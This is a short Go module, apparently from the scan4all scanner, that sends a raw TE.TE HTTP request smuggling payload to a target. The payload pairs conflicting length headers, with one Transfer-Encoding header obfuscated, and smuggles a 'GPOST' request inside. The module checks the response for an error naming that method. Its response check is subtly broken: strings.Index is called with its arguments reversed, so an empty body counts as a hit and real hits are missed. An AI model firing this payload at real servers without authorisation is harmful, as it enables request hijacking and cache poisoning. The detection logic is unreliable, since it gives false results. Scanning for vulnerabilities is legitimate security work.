package Smuggling

import (
	"github.com/hktalent/scan4all/lib/socket"
	"strings"
)

var TeTePayload = []string{`POST / HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`}

func init() {
	for n, x := range TeTePayload {
		x = strings.ReplaceAll(x, "\n", "\r\n")
		TeTePayload[n] = x
	}
}

type TeTe struct {
}

func (r *TeTe) CheckResponse(body string) bool {
	return -1 < strings.Index("Unrecognized method GPOST", body)
}

func (r *TeTe) GetPayloads() *[]string {
	return &TeTePayload
}
func (r *TeTe) Check(rc *socket.CheckTarget) {
	for _, x := range TeTePayload {
		s := rc.SendOnePayload(x, 1)
		if r.CheckResponse(s) {
			break
		}
	}
}
